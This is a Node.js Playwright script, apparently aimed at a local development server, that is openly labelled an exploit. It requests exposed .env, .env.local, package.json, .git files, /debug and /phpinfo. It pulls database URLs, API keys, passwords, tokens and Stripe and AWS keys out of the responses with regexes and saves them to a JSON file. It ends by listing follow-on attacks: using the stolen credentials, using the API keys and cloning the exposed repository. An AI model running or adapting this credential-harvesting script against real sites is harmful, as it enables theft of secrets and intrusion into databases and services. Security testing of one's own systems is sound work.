const { chromium } = require('playwright');
const fs = require('fs').promises;

const BASE_URL = 'http://localhost:3001';

async function exploitExposedFiles() {
  console.log('üíÄ EXPLOITING EXPOSED FILES\n');

  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage();

  const exploitData = {};

  // Exploit .env file
  console.log('üìÅ Extracting .env file...');
  try {
    const response = await page.goto(`${BASE_URL}/.env`, {
      waitUntil: 'networkidle'
    });

    if (response && response.status() === 200) {
      const content = await page.content();
      const textContent = await page.textContent('body');

      console.log('‚úì .env FILE CONTENTS EXTRACTED:');
      console.log('-'.repeat(50));
      console.log(textContent.substring(0, 1000));
      console.log('-'.repeat(50));

      // Look for sensitive keys
      const secrets = {
        database: textContent.match(/DATABASE_URL=(.+)/),
        apiKeys: textContent.match(/API_KEY=(.+)/),
        secrets: textContent.match(/SECRET=(.+)/),
        passwords: textContent.match(/PASSWORD=(.+)/),
        tokens: textContent.match(/TOKEN=(.+)/),
        stripeKeys: textContent.match(/STRIPE_(.+)=(.+)/g),
        awsKeys: textContent.match(/AWS_(.+)=(.+)/g)
      };

      exploitData['.env'] = {
        fullContent: textContent,
        extractedSecrets: secrets
      };

      if (secrets.database) {
        console.log('üîë DATABASE CONNECTION STRING FOUND!');
      }
      if (secrets.apiKeys) {
        console.log('üîë API KEYS FOUND!');
      }
    }
  } catch (e) {
    console.log('Could not extract .env:', e.message);
  }

  // Exploit .env.local file
  console.log('\nüìÅ Extracting .env.local file...');
  try {
    const response = await page.goto(`${BASE_URL}/.env.local`, {
      waitUntil: 'networkidle'
    });

    if (response && response.status() === 200) {
      const textContent = await page.textContent('body');

      console.log('‚úì .env.local FILE CONTENTS EXTRACTED:');
      console.log('-'.repeat(50));
      console.log(textContent.substring(0, 1000));
      console.log('-'.repeat(50));

      exploitData['.env.local'] = {
        fullContent: textContent
      };
    }
  } catch (e) {
    console.log('Could not extract .env.local:', e.message);
  }

  // Exploit package.json
  console.log('\nüìÅ Extracting package.json...');
  try {
    const response = await page.goto(`${BASE_URL}/package.json`, {
      waitUntil: 'networkidle'
    });

    if (response && response.status() === 200) {
      const textContent = await page.textContent('body');

      console.log('‚úì package.json EXTRACTED - Looking for vulnerabilities...');

      try {
        const packageData = JSON.parse(textContent);
        console.log('Dependencies:', Object.keys(packageData.dependencies || {}).length);
        console.log('Scripts available:', Object.keys(packageData.scripts || {}));

        // Look for vulnerable packages
        const deps = packageData.dependencies || {};
        const vulnerablePkgs = [];

        // Check for known vulnerable versions
        if (deps['express'] && deps['express'].includes('3.')) {
          vulnerablePkgs.push('Express 3.x - Multiple vulnerabilities');
        }
        if (deps['jsonwebtoken'] && deps['jsonwebtoken'].includes('7.')) {
          vulnerablePkgs.push('jsonwebtoken < 9.0.0 - Security issues');
        }

        if (vulnerablePkgs.length > 0) {
          console.log('‚ö†Ô∏è VULNERABLE PACKAGES FOUND:', vulnerablePkgs);
        }

        exploitData['package.json'] = {
          dependencies: deps,
          scripts: packageData.scripts,
          vulnerablePackages: vulnerablePkgs
        };
      } catch (e) {
        console.log('Could not parse package.json');
      }
    }
  } catch (e) {
    console.log('Could not extract package.json:', e.message);
  }

  // Exploit .git/config
  console.log('\nüìÅ Extracting .git/config...');
  try {
    const response = await page.goto(`${BASE_URL}/.git/config`, {
      waitUntil: 'networkidle'
    });

    if (response && response.status() === 200) {
      const textContent = await page.textContent('body');

      console.log('‚úì GIT CONFIG EXTRACTED:');
      console.log('-'.repeat(50));
      console.log(textContent);
      console.log('-'.repeat(50));

      // Extract repository URLs
      const repoUrls = textContent.match(/url = (.+)/g);
      if (repoUrls) {
        console.log('üîë REPOSITORY URLs FOUND:', repoUrls);
      }

      exploitData['.git/config'] = {
        content: textContent,
        repoUrls
      };
    }
  } catch (e) {
    console.log('Could not extract .git/config:', e.message);
  }

  // Try to access more git files
  console.log('\nüîç Attempting to extract more Git data...');
  const gitFiles = [
    '/.git/HEAD',
    '/.git/logs/HEAD',
    '/.git/index',
    '/.git/COMMIT_EDITMSG',
    '/.git/description',
    '/.git/info/exclude',
    '/.git/hooks/pre-commit'
  ];

  for (const file of gitFiles) {
    try {
      const response = await page.goto(`${BASE_URL}${file}`, {
        waitUntil: 'domcontentloaded',
        timeout: 2000
      });

      if (response && response.status() === 200) {
        console.log(`‚úì Git file accessible: ${file}`);
        const content = await page.textContent('body');
        exploitData[file] = content.substring(0, 200);
      }
    } catch (e) {
      // Silent fail
    }
  }

  // Check debug endpoints
  console.log('\nüîç Exploiting debug endpoints...');
  try {
    const response = await page.goto(`${BASE_URL}/debug`, {
      waitUntil: 'networkidle'
    });

    if (response && response.status() === 200) {
      const textContent = await page.textContent('body');
      console.log('‚úì DEBUG PAGE CONTENT:');
      console.log(textContent.substring(0, 500));

      exploitData['/debug'] = textContent;
    }
  } catch (e) {
    console.log('Could not access /debug');
  }

  try {
    const response = await page.goto(`${BASE_URL}/phpinfo`, {
      waitUntil: 'networkidle'
    });

    if (response && response.status() === 200) {
      const textContent = await page.textContent('body');
      console.log('‚úì PHPINFO PAGE FOUND - System information exposed!');

      // Extract sensitive info from phpinfo
      const systemInfo = {
        serverSoftware: textContent.match(/SERVER_SOFTWARE(.+)/),
        documentRoot: textContent.match(/DOCUMENT_ROOT(.+)/),
        serverAdmin: textContent.match(/SERVER_ADMIN(.+)/),
        phpVersion: textContent.match(/PHP Version (.+)/)
      };

      exploitData['/phpinfo'] = systemInfo;
    }
  } catch (e) {
    console.log('Could not access /phpinfo');
  }

  await browser.close();

  // Generate exploit report
  console.log('\n' + '='.repeat(60));
  console.log('üíÄ EXPLOIT SUMMARY');
  console.log('='.repeat(60));

  console.log('\nüö® CRITICAL DATA BREACHES:\n');

  if (exploitData['.env']) {
    console.log('1. ENVIRONMENT VARIABLES EXPOSED (.env)');
    console.log('   - Full configuration file accessible');
    console.log('   - Contains database credentials, API keys, secrets');
  }

  if (exploitData['.git/config']) {
    console.log('\n2. GIT REPOSITORY EXPOSED');
    console.log('   - Source code potentially downloadable');
    console.log('   - Commit history accessible');
    console.log('   - Repository URLs exposed');
  }

  if (exploitData['package.json']) {
    console.log('\n3. APPLICATION STRUCTURE EXPOSED');
    console.log('   - All dependencies visible');
    console.log('   - Build scripts exposed');
    console.log('   - Potential vulnerability mapping possible');
  }

  // Save detailed exploit data
  await fs.writeFile('exploit-data.json', JSON.stringify(exploitData, null, 2));
  console.log('\nüíæ Full exploit data saved to exploit-data.json');

  // Generate attack recommendations
  console.log('\n' + '='.repeat(60));
  console.log('üéØ NEXT ATTACK VECTORS TO EXPLOIT:');
  console.log('='.repeat(60));
  console.log('\n1. Use database credentials from .env to directly access database');
  console.log('2. Use API keys to access external services');
  console.log('3. Clone entire repository using exposed .git directory');
  console.log('4. Use exposed configuration to map entire application structure');
  console.log('5. Exploit known vulnerabilities in exposed dependencies');

  return exploitData;
}

// Run the exploit
exploitExposedFiles().catch(console.error);